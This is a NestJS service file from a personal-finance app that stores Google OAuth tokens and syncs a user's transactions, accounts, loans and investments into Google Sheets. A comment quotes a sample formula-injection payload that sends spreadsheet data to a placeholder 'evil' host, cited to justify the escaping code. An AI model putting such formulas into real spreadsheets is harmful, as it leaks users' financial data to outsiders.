import { Injectable, BadRequestException, Logger } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, Between } from 'typeorm';
import { ConfigService } from '@nestjs/config';
import axios from 'axios';
import { User } from '../database/entities/user.entity';
import { Expense } from '../database/entities/expense.entity';
import { Loan } from '../database/entities/loan.entity';
import { Investment } from '../database/entities/investment.entity';
import { encrypt, decrypt, encryptV2, decryptV2 } from '../utils/crypto';
import { ConnectSheetsDto, ExchangeSheetsCodeDto } from './dto/connect-sheets.dto';
import { currentIstMonth, istMonthRange, isIncome, isSpend } from '../utils/ledger';
import { Account } from '../database/entities/account.entity';
import { CategoriesService } from '../categories/categories.service';
import {
  ACCOUNT_HEADER, INVESTMENT_HEADER, LOAN_HEADER, Row, TAB, TRANSACTION_HEADER,
  accountRows, columnLetter, investmentRows, loanRows, mergeById, range, transactionRows,
} from './sheets-export';

/**
 * Sheets evaluates USER_ENTERED strings, so a merchant or note such as
 * `=IMPORTXML("https://evil/?d="&B2, ...)` would run in the user's sheet and could
 * send their data out. Prefix text that starts like a formula with an apostrophe
 * so it is stored as plain text; numbers and dates are untouched.
 */
function escapeFormulas(rows: unknown[][]): unknown[][] {
  return rows.map((row) =>
    row.map((cell) => (typeof cell === 'string' && /^[=+\-@]/.test(cell) ? `'${cell}` : cell)),
  );
}

@Injectable()
export class SheetsService {
  private readonly logger = new Logger(SheetsService.name);

  constructor(
    @InjectRepository(User)
    private readonly usersRepository: Repository<User>,
    @InjectRepository(Expense)
    private readonly expensesRepository: Repository<Expense>,
    @InjectRepository(Loan)
    private readonly loansRepository: Repository<Loan>,
    @InjectRepository(Investment)
    private readonly investmentsRepository: Repository<Investment>,
    @InjectRepository(Account)
    private readonly accountsRepository: Repository<Account>,
    private readonly categoriesService: CategoriesService,
    private readonly config: ConfigService,
  ) {}

  /** Old tokens were encrypted with this public value; kept only to read them. */
  private legacySecret(): string {
    return this.config.get<string>('FIREBASE_PROJECT_ID') || 'default-spendly-secret-key';
  }

  /** Private key for stored refresh tokens. Without it, fall back to the legacy scheme. */
  private tokenKey(): string | undefined {
    return this.config.get<string>('SHEETS_TOKEN_KEY') || undefined;
  }

  private sealToken(refreshToken: string): string {
    const key = this.tokenKey();
    if (!key) {
      this.logger.warn('SHEETS_TOKEN_KEY is not set; storing the Sheets token with the legacy key');
      return encrypt(refreshToken, this.legacySecret());
    }
    return encryptV2(refreshToken, key);
  }

  private openToken(stored: string): { token: string; isLegacy: boolean } {
    if (stored.startsWith('v2:')) {
      const key = this.tokenKey();
      if (!key) throw new BadRequestException('Server is missing SHEETS_TOKEN_KEY');
      return { token: decryptV2(stored, key), isLegacy: false };
    }
    return { token: decrypt(stored, this.legacySecret()), isLegacy: true };
  }

  async connect(userId: string, dto: ConnectSheetsDto) {
    return this.saveConnection(userId, dto.sheetsId, dto.sheetsToken);
  }

  /**
   * Exchanges a Google OAuth authorization code on the server, so the client
   * secret never reaches the browser.
   */
  async connectWithCode(userId: string, dto: ExchangeSheetsCodeDto) {
    const allowed = (this.config.get<string>('SHEETS_OAUTH_REDIRECT_URIS') ?? '')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean);
    if (!allowed.includes(dto.redirectUri)) {
      throw new BadRequestException('redirectUri is not allowed');
    }

    let refreshToken: string | undefined;
    try {
      const response = await axios.post(
        'https://oauth2.googleapis.com/token',
        new URLSearchParams({
          client_id: this.config.get<string>('GOOGLE_SHEETS_CLIENT_ID') ?? '',
          client_secret: this.config.get<string>('GOOGLE_SHEETS_CLIENT_SECRET') ?? '',
          code: dto.code,
          grant_type: 'authorization_code',
          redirect_uri: dto.redirectUri,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 15_000 },
      );
      refreshToken = response.data.refresh_token;
    } catch (error) {
      this.logger.error(`Google code exchange failed: ${error.response?.data?.error || error.message}`);
      throw new BadRequestException('Google authorization failed. Please try connecting again.');
    }
    if (!refreshToken) {
      throw new BadRequestException(
        'Google returned no refresh token. Remove Fiscora from your Google account permissions and try again.',
      );
    }
    return this.saveConnection(userId, dto.sheetsId, refreshToken);
  }

  private async saveConnection(userId: string, sheetsId: string, refreshToken: string) {
    if (!/^[A-Za-z0-9_-]{20,100}$/.test(sheetsId)) {
      throw new BadRequestException('Invalid spreadsheet ID');
    }
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new BadRequestException('User not found');
    }

    user.sheetsConnected = true;
    user.sheetsId = sheetsId;
    user.sheetsToken = this.sealToken(refreshToken);
    await this.usersRepository.save(user);
    // Never return the user row: it holds the (encrypted) token and FCM token.
    return this.getStatus(userId);
  }

  async disconnect(userId: string): Promise<User> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new BadRequestException('User not found');
    }

    user.sheetsConnected = false;
    user.sheetsId = null;
    user.sheetsToken = null;

    return this.usersRepository.save(user);
  }

  async getStatus(userId: string) {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new BadRequestException('User not found');
    }

    return {
      connected: user.sheetsConnected,
      sheetsId: user.sheetsId,
      lastSyncedAt: user.lastSyncedAt,
    };
  }

  private async refreshAccessToken(refreshToken: string): Promise<string> {
    const clientId = this.config.get<string>('GOOGLE_SHEETS_CLIENT_ID');
    const clientSecret = this.config.get<string>('GOOGLE_SHEETS_CLIENT_SECRET');

    try {
      const response = await axios.post('https://oauth2.googleapis.com/token', {
        client_id: clientId,
        client_secret: clientSecret,
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
      });

      return response.data.access_token;
    } catch (error) {
      this.logger.error(`Failed to refresh Google OAuth token: ${error.response?.data?.error || error.message}`);
      throw new BadRequestException('Google Sheets authorization failed (unable to refresh token)');
    }
  }

  async sync(userId: string): Promise<void> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user || !user.sheetsConnected || !user.sheetsId || !user.sheetsToken) {
      throw new BadRequestException('Google Sheets not connected');
    }

    const { token: decryptedToken, isLegacy } = this.openToken(user.sheetsToken);
    if (isLegacy && this.tokenKey()) {
      // Re-encrypt tokens stored under the old public key.
      user.sheetsToken = this.sealToken(decryptedToken);
      await this.usersRepository.save(user);
    }
    
    // Refresh token to get active access token
    const accessToken = await this.refreshAccessToken(decryptedToken);
    const spreadsheetId = user.sheetsId;

    const [expenses, loans, investments, accounts, names] = await Promise.all([
      this.expensesRepository.find({ where: { userId, isDeleted: false }, order: { date: 'ASC' } }),
      this.loansRepository.find({ where: { userId, isDeleted: false }, order: { createdAt: 'ASC' } }),
      this.investmentsRepository.find({ where: { userId, isDeleted: false }, order: { startDate: 'ASC' } }),
      this.accountsRepository.find({ where: { userId, isDeleted: false }, order: { createdAt: 'ASC' } }),
      this.categoriesService.namesForUser(userId),
    ]);

    // Transactions store the id devices know an account by (clientId or id).
    const accountNames = new Map<string, string>();
    for (const a of accounts) {
      accountNames.set(a.id, a.name);
      if (a.clientId) accountNames.set(a.clientId, a.name);
    }
    const accountName = (id: string | null | undefined) => (id ? accountNames.get(id) ?? id : '');

    const tabs: { tab: string; header: Row; rows: Map<string, Row> }[] = [
      { tab: TAB.transactions, header: TRANSACTION_HEADER, rows: transactionRows(expenses, names, accountName) },
      { tab: TAB.accounts, header: ACCOUNT_HEADER, rows: accountRows(accounts) },
      { tab: TAB.loans, header: LOAN_HEADER, rows: loanRows(loans) },
      { tab: TAB.investments, header: INVESTMENT_HEADER, rows: investmentRows(investments) },
    ];

    await this.ensureSheetTabsExist(spreadsheetId, accessToken, [...tabs.map((t) => t.tab), TAB.monthly]);

    // Read what is in Fiscora's own columns now, then merge by ID so existing
    // rows keep their place and the user's extra columns stay aligned.
    const auth = { headers: { Authorization: `Bearer ${accessToken}` } };
    const current = await axios.get(
      `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values:batchGet`,
      {
        ...auth,
        params: { ranges: tabs.map((t) => range(t.tab, `A:${columnLetter(t.header.length)}`)) },
        paramsSerializer: { indexes: null },
      },
    );
    const existing: string[][][] = (current.data.valueRanges ?? []).map((v: any) => v.values ?? []);

    const data = tabs.map((t, i) => ({
      range: range(t.tab, 'A1'),
      values: escapeFormulas(mergeById(t.header, existing[i] ?? [], t.rows)),
    }));
    // The monthly summary is derived, so Fiscora owns that whole tab.
    data.push({ range: range(TAB.monthly, 'A1'), values: escapeFormulas(await this.getSummaryData(userId)) });

    await axios.post(
      `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values:batchUpdate`,
      { valueInputOption: 'USER_ENTERED', data },
      auth,
    );

    user.lastSyncedAt = new Date();
    await this.usersRepository.save(user);
  }

  private async ensureSheetTabsExist(spreadsheetId: string, accessToken: string, requiredSheets: string[]): Promise<void> {
    try {
      const response = await axios.get(
        `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}`,
        { headers: { Authorization: `Bearer ${accessToken}` } },
      );

      const existingSheets = response.data.sheets.map((s: any) => s.properties.title);
      const requests: any[] = [];

      for (const sheet of requiredSheets) {
        if (!existingSheets.includes(sheet)) {
          requests.push({
            addSheet: {
              properties: { title: sheet },
            },
          });
        }
      }

      if (requests.length > 0) {
        await axios.post(
          `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}:batchUpdate`,
          { requests },
          { headers: { Authorization: `Bearer ${accessToken}` } },
        );
      }
    } catch (error) {
      this.logger.error(`Failed to verify or create sheet tabs: ${error.response?.data?.error || error.message}`);
      throw new BadRequestException('Google Sheets tab verification failed');
    }
  }

  private async getSummaryData(userId: string): Promise<any[][]> {
    const summaryRows: any[][] = [['Month', 'Income', 'Spent', 'Net']];

    // Last 12 IST months, oldest first
    const [cy, cm] = currentIstMonth().split('-').map(Number);
    for (let i = 11; i >= 0; i--) {
      const d = new Date(Date.UTC(cy, cm - 1 - i, 1));
      const monthStr = `${d.getUTCFullYear()}-${String(d.getUTCMonth() + 1).padStart(2, '0')}`;
      const { start, end } = istMonthRange(monthStr);

      const expenses = await this.expensesRepository.find({
        where: {
          userId,
          isDeleted: false,
          date: Between(start, new Date(end.getTime() - 1)),
        },
      });

      const totalExpenses = expenses.filter(isSpend).reduce((sum, e) => sum + e.amount, 0);
      const totalIncome = expenses.filter(isIncome).reduce((sum, e) => sum - e.amount, 0);
      const balance = totalIncome - totalExpenses;

      summaryRows.push([monthStr, totalIncome, totalExpenses, balance]);
    }

    return summaryRows;
  }
}
